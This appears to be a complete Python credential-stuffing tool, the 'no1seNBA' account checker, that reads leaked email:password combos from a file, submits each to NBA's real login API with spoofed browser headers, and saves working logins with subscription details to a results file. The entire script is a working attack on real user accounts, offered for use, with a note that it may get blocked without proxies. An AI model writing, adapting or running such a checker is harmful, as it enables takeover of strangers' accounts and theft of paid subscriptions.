#Coded and made by no1se
import requests
import os
import platform
import time
from datetime import datetime
from colorama import Fore, Back, Style, init
import json

init(autoreset=True)

# art
art = """
        ██████  ██████  ██████  ███████ ██████      ██████  ██    ██     ███    ██  ██████   ██ ███████ ███████ 
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██  ██  ██      ████   ██ ██    ██ ███ ██      ██      
        ██      ██    ██ ██   ██ █████   ██   ██     ██████    ████       ██ ██  ██ ██    ██  ██ ███████ █████   
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██    ██        ██  ██ ██ ██    ██  ██      ██ ██      
        ██████  ██████  ██████  ███████ ██████      ██████     ██        ██   ████  ██████   ██ ███████ ███████ 
                                                1.0                                                                 
"""

art2 = """
        ██████╗ ██████╗ ██████╗ ███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ██╗ ██████╗  ██╗███████╗███████╗
        ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗  ██║██╔═══██╗███║██╔════╝██╔════╝
        ██║     ██║   ██║██║  ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔██╗ ██║██║   ██║╚██║███████╗█████╗  
        ██║     ██║   ██║██║  ██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╗██║██║   ██║ ██║╚════██║██╔══╝  
        ╚██████╗╚██████╔╝██████╔╝███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚████║╚██████╔╝ ██║███████║███████╗
        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═══╝ ╚═════╝  ╚═╝╚══════╝╚══════╝
                                                2.0
"""
# Clear function like always
def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

#My Amazing intro
def intro():
    clear()
    print(Fore.RED + art)
    time.sleep(0.5)
    clear()
    print(Fore.BLUE + art2)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTCYAN_EX + art)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTMAGENTA_EX + art2)

if os.path.exists('combo.txt') and os.path.getsize('combo.txt') > 0:
    with open('combo.txt', 'r') as f:
        combo_list = f.read().splitlines()
else:
    print("Please create a combo.txt file")
    exit(1)


good = 0
bad = 0



result_folder = os.path.join("results", datetime.now().strftime("%Y-%m-%d"))
os.makedirs(result_folder, exist_ok=True)
current_time = datetime.now().strftime("%Y%m%d%H%M%S")
result_file_path = os.path.join(result_folder, f"Valid_accounts_{current_time}.txt")



#Spent 3 days on this shit right here
def checker_proxyless():
    clear()
    print(Fore.LIGHTMAGENTA_EX + art2)
    global good, bad, result_file_path
    print(f"\r{Fore.GREEN}Good:{Fore.WHITE} {good} |{Fore.RED} Bad:{Fore.WHITE} {bad}", end='', flush=True)

    #main Loop for each request
    for combo in combo_list:
        #No need for a try loop because there are never any errors in my code :) (Nah I'm kidding)
        email, password = combo.split(':')
        
        payload = {
            "email": email,
            "password": password,
            "rememberMe": False
        }

        headers = {
            'Host': 'identity.nba.com',
            'Content-Length': '77',
            'Sec-Ch-Ua': '"Chromium";v="121", "Not A(Brand";v="99"',
            'Content-Type': 'application/json',
            'Sec-Ch-Ua-Mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
            'X-Client-Platform': 'web',
            'Sec-Ch-Ua-Platform': '"Linux"',
            'Accept': '*/*',
            'Origin': 'https://www.nba.com',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.nba.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Priority': 'u=1, i',
            'Connection': 'close',
        }
        try:
            url = "https://identity.nba.com/api/v1/auth"
            response = requests.post(url, json=payload,headers=headers)
            if response.status_code == 200 and "League Pass" in response.text:
                good += 1
                print(f"\r{Fore.GREEN}Good:{Fore.WHITE} {good} |{Fore.RED} Bad:{Fore.WHITE} {bad}", end='', flush=True)
                response_data = json.loads(response.text)

                #json values
                end_value = response_data.get("data", {}).get("subscriptions", {}).get("AccountServiceMessage", [{}])[0].get("formattedValidityEndDateWithTZ")
                displayname = response_data.get("data", {}).get("subscriptions", {}).get("AccountServiceMessage", [{}])[0].get("displayName")
                country = response_data.get("data", {}).get("subscriptions", {}).get("AccountServiceMessage", [{}])[0].get("orderCountry")
                renewal = response_data.get("data", {}).get("subscriptions", {}).get("AccountServiceMessage", [{}])[0].get("isRenewal")
                #json values

                with open(result_file_path, 'a') as result_file:
                    result_file.write(f"Made With <3 By no1se\n")
                    result_file.write(f"=======================\n")
                    result_file.write(f"{displayname}:\n")
                    result_file.write(f"{email}:{password}\n")
                    result_file.write(f"Subscription ending in: {end_value}\n")
                    result_file.write(f"Account country: {country}\n")
                    result_file.write(f"Account renewal: {renewal}\n")
            else:
                bad += 1
                print(f"\r{Fore.GREEN}Good:{Fore.WHITE} {good} |{Fore.RED} Bad:{Fore.WHITE} {bad}", end='', flush=True)
        
        except Exception as e:
            print(e)
        time.sleep(3)
#Spent 3 days on this shit right here


def main_menu():
    while True:
        #Squidward
        clear()
        print("        .--'''''''''--.")
        print("     .'      .---.      '.")
        print("    /    .-----------.    \'")
        print("   /        .-----.        \'")
        print("   |       .-.   .-.       |")
        print("   |      /   \ /   \      |")
        print("    \    | .-. | .-. |    /")
        print("     '-._| | | | | | |_.-'")
        print("         | '-' | '-' |")
        print("          \___/ \___/")
        print("       _.-'  /   \  `-._")
        print("     .' _.--|     |--._ '.")
        print("     ' _...-|     |-..._ '")
        print("            |     |")
        print("            '.___.'")
        #Squidward
        print(Fore.RED+"Welcome to no1seNBA - NBA Account Checker.")
        print(Fore.LIGHTYELLOW_EX+"Please select an option:")
        print(f"{Fore.WHITE}1. Start proxyless checker (might get blocked after a short time){Style.RESET_ALL}")
        print(f"{Fore.WHITE}2. Exit{Style.RESET_ALL}")
        choice = input(f"{Fore.LIGHTBLUE_EX}Enter your choice:{Fore.WHITE} ")
        if choice == "1":
            checker_proxyless()
            print(f"{Fore.GREEN}Done! Your accounts are saved in the results folder!")
            exit(1)
        elif choice == "2":
            print(f"{Fore.LIGHTYELLOW_EX}Bye! :(")
            exit(1)
        else:
            print("")
            print(f"{Fore.RED}Please select a valid option!")
            time.sleep(2)


intro()
main_menu()
#Coded and made by no1se








